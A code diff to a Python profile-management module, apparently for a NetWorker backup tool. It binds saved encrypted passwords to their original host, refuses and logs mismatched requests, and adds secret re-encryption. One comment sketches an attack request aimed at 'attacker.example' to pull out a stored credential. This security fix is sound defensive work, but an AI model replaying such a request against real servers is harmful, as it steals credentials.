@@ -20,12 +20,18 @@ from .config import (
     DEFAULT_REPORT_RANGE,
     DEFAULT_TIMEOUT_SECONDS,
     HOST_PATTERN,
+    LOG,
     PROFILES_FILE,
     REPORT_RANGES,
     _PROFILE_PW_SAVED,
     _PROFILE_PW_SENTINEL,
+    safe_log_text,
 )
-from .secrets import decrypt_profile_secret
+from .secrets import (
+    decrypt_profile_secret,
+    encrypt_profile_secret,
+    profile_secret_needs_rebinding,
+)
 from .models import ApiConfig, BadRequest
 
 # ── Connection profiles ───────────────────────────────────────────────────────
@@ -43,13 +49,16 @@ def load_profiles() -> dict[str, Any]:
 
 
 def save_profiles(profiles: dict[str, Any]) -> None:
+    """Persist profiles. Raises OSError if the write fails — swallowing it let the
+    UI report "Profile saved" for a save that never reached disk."""
     try:
         DATA_DIR.mkdir(parents=True, exist_ok=True)
         tmp = PROFILES_FILE.with_suffix(".tmp")
         tmp.write_text(json.dumps(profiles, separators=(",", ":")), encoding="utf-8")
         tmp.replace(PROFILES_FILE)
-    except OSError:
-        pass
+    except OSError as exc:
+        LOG.error(f"could not write {PROFILES_FILE.name}: {exc}", extra={"event": "profiles_write_failed"})
+        raise
 
 
 def _mask_profiles(profiles: dict[str, Any]) -> dict[str, Any]:
@@ -65,24 +74,203 @@ def _mask_profiles(profiles: dict[str, Any]) -> dict[str, Any]:
     return masked
 
 
+# ── Profile secret <-> destination binding ────────────────────────────────────
+# A saved profile's secret may only ever travel to the connection that profile
+# was saved for. These fields therefore come from the STORED profile as one
+# unit and are never taken from the request (cf. RUCKUS
+# auth/profiles.py::to_connection_form, which hands back the whole stored form).
+#
+# Without this, an authenticated user — or a successful CSRF — could post
+#   {"profileName": "prod-nw", "restApiHost": "attacker.example", "password": "__profile_password__"}
+# and the server would decrypt the production NetWorker credential and send it
+# straight to attacker.example. The host allow-list is the only other guard and
+# it is off by default ("If unset, any host is permitted", main.py --allowed-hosts).
+_BOUND_FIELD_LABELS: dict[str, str] = {
+    "restApiHost": "REST API server",
+    "restApiPort": "REST API port",
+    "backupServerHost": "Backup server",
+    "backupServerPort": "AuthC port",
+    "username": "Username",
+    "verifyTls": "Verify TLS",
+}
+_SENTINELS = (_PROFILE_PW_SENTINEL, _PROFILE_PW_SAVED)
+
+
+def _connection_target(source: dict[str, Any]) -> dict[str, Any]:
+    """Normalize the destination a payload or a stored profile describes, so the
+    two can be compared regardless of how the host was spelled ('h', 'h:9090',
+    'https://h:9090') or whether ports arrived as strings."""
+    rest_host, rest_embedded = parse_host(source.get("restApiHost"), "REST API server")
+    rest_port = parse_port(source.get("restApiPort") or rest_embedded, DEFAULT_API_PORT, "REST API port")
+    backup_raw = str(source.get("backupServerHost") or "").strip()
+    if backup_raw:
+        backup_host, backup_embedded = parse_host(backup_raw, "Backup server")
+    else:
+        backup_host, backup_embedded = rest_host, None
+    backup_port = parse_port(source.get("backupServerPort") or backup_embedded, DEFAULT_API_PORT, "AuthC port")
+    return {
+        "restApiHost": _normalize_host(rest_host),
+        "restApiPort": rest_port,
+        "backupServerHost": _normalize_host(backup_host),
+        "backupServerPort": backup_port,
+        "username": str(source.get("username") or "").strip(),
+        # A request must not be able to turn TLS verification off for a stored
+        # credential: that would expose it to anyone on the path to the host.
+        "verifyTls": bool(source.get("verifyTls", True)),
+    }
+
+
+def profile_connection_form(profile_name: str, profiles: dict[str, Any]) -> dict[str, Any] | None:
+    """The stored profile's destination + credentials as ONE unit, or None when
+    no such profile exists. Analogue of RUCKUS's to_connection_form: the caller
+    gets the whole saved form, never a stored secret it can re-aim."""
+    prof = profiles.get(profile_name)
+    if not isinstance(prof, dict):
+        return None
+    try:
+        form = _connection_target(prof)
+    except BadRequest as exc:
+        raise BadRequest(
+            f"Saved profile '{profile_name}' stores an unusable connection ({exc}). "
+            "Re-save the profile."
+        ) from exc
+    # Profiles saved before verifyTls existed cannot be held to a value they
+    # never recorded — bind it only when the profile actually specifies it.
+    form["_binds_verify_tls"] = "verifyTls" in prof
+    form["password"] = decrypt_profile_secret(
+        str(prof.get("_enc_password") or ""), name=profile_name, field="password"
+    )
+    form["wmiPassword"] = decrypt_profile_secret(
+        str(prof.get("_enc_wmiPassword") or ""), name=profile_name, field="wmiPassword"
+    )
+    form["_has_password"] = bool(prof.get("_enc_password"))
+    form["_has_wmi_password"] = bool(prof.get("_enc_wmiPassword"))
+    return form
+
+
 def _resolve_profile_password(payload: dict[str, Any]) -> dict[str, Any]:
-    """If password is sentinel, look up and decrypt from saved profile."""
+    """Substitute a saved profile's stored secrets together with the destination
+    they were saved for.
+
+    A stored credential and a caller-supplied destination are never combined. If
+    the request asks to send a saved secret anywhere other than that profile's
+    own connection, it is refused — the operator must re-enter the password,
+    which is the one flow that legitimately targets a different host (a DR pair
+    sharing an account, or reusing a profile as a template for a new server).
+    Typing a real password bypasses this whole path, so that flow still works.
+    """
     profile_name = str(payload.get("profileName") or "").strip()
     pw   = str(payload.get("password")    or "")
     wpw  = str(payload.get("wmiPassword") or "")
     if not profile_name:
         return payload
-    if pw not in (_PROFILE_PW_SENTINEL, _PROFILE_PW_SAVED) and wpw not in (_PROFILE_PW_SENTINEL, _PROFILE_PW_SAVED):
+    wants_password = pw in _SENTINELS
+    wants_wmi = wpw in _SENTINELS
+    if not wants_password and not wants_wmi:
+        # No stored secret is involved — the caller supplied its own credential
+        # and may target whatever the allow-list permits.
         return payload
+
     with PROFILES_LOCK:
         profiles = load_profiles()
-    prof = profiles.get(profile_name, {})
+    form = profile_connection_form(profile_name, profiles)
+    if form is None:
+        raise BadRequest(
+            f"Saved profile '{profile_name}' was not found on this server. "
+            "Re-enter the password to connect."
+        )
+
+    bound_keys = [
+        key for key in _BOUND_FIELD_LABELS
+        if key != "verifyTls" or form["_binds_verify_tls"]
+    ]
+    requested = _connection_target(payload)
+    differing = [
+        _BOUND_FIELD_LABELS[key]
+        for key in bound_keys
+        if requested.get(key) != form.get(key)
+    ]
+    if differing:
+        LOG.warning(
+            "refused to send profile '%s' stored credential to a different target "
+            "(changed: %s; profile host=%s, requested host=%s)",
+            safe_log_text(profile_name, 80),
+            ", ".join(differing),
+            safe_log_text(form["restApiHost"], 120),
+            safe_log_text(requested["restApiHost"], 120),
+            extra={"event": "profile_target_mismatch"},
+        )
+        raise BadRequest(
+            f"The password saved with profile '{profile_name}' can only be used with that "
+            f"profile's own connection ({form['username']}@{form['restApiHost']}:{form['restApiPort']}). "
+            f"This request changed: {', '.join(differing)}. "
+            "Re-enter the password to connect to a different target."
+        )
+
     result = dict(payload)
-    if pw in (_PROFILE_PW_SENTINEL, _PROFILE_PW_SAVED):
-        result["password"] = decrypt_profile_secret(prof.get("_enc_password", ""))
-    if wpw in (_PROFILE_PW_SENTINEL, _PROFILE_PW_SAVED):
-        result["wmiPassword"] = decrypt_profile_secret(prof.get("_enc_wmiPassword", ""))
+    # Belt and braces: even though the request matched, the destination actually
+    # used is read back out of the stored profile, so no comparison gap can put
+    # a stored secret on a caller-chosen host.
+    for key in bound_keys:
+        result[key] = form[key]
+    if wants_password:
+        if not form["password"]:
+            raise BadRequest(_missing_secret_message(profile_name, "password", form["_has_password"]))
+        result["password"] = form["password"]
+    if wants_wmi:
+        if not form["wmiPassword"] and form["_has_wmi_password"]:
+            raise BadRequest(_missing_secret_message(profile_name, "WMI password", True))
+        result["wmiPassword"] = form["wmiPassword"]
     return result
+
+
+def _missing_secret_message(profile_name: str, label: str, stored: bool) -> str:
+    """Tell the operator what actually went wrong. A failed decrypt used to fall
+    through to validate_payload's "Password is required.", which says they forgot
+    to type something when in fact the key that would decrypt it is gone."""
+    if not stored:
+        return f"Profile '{profile_name}' has no saved {label}. Enter it to connect."
+    return (
+        f"The saved {label} for profile '{profile_name}' could not be decrypted. The key in "
+        "data/.session_key is missing, or belongs to another machine or Windows account. "
+        f"Re-enter the {label} to connect and save it again."
+    )
+
+
+def migrate_profile_secrets() -> int:
+    """Re-encrypt stored profile secrets under the name||field-bound AAD (enc:v2).
+
+    Existing enc:v1 and legacy Fernet blobs keep decrypting, so nothing breaks if
+    this never runs; a blob that fails to decrypt is left exactly as it is rather
+    than replaced. Returns the number of secrets rebound.
+    """
+    rebound = 0
+    with PROFILES_LOCK:
+        profiles = load_profiles()
+        for name, prof in profiles.items():
+            if not isinstance(prof, dict):
+                continue
+            for field in ("password", "wmiPassword"):
+                stored = str(prof.get(f"_enc_{field}") or "")
+                if not profile_secret_needs_rebinding(stored):
+                    continue
+                plaintext = decrypt_profile_secret(stored, name=name, field=field)
+                if not plaintext:
+                    LOG.warning(
+                        f"profile '{safe_log_text(name, 80)}' {field} could not be decrypted; "
+                        "left in its stored form for recovery"
+                    )
+                    continue
+                try:
+                    prof[f"_enc_{field}"] = encrypt_profile_secret(plaintext, name=name, field=field)
+                except Exception as exc:  # noqa: BLE001 — never lose the old blob over a rewrite
+                    LOG.error(f"could not rebind profile '{safe_log_text(name, 80)}' {field}: {exc}")
+                    continue
+                rebound += 1
+        if rebound:
+            save_profiles(profiles)
+            LOG.info(f"rebound {rebound} stored profile secret(s) to the per-profile AAD (enc:v2)")
+    return rebound
 
 
 
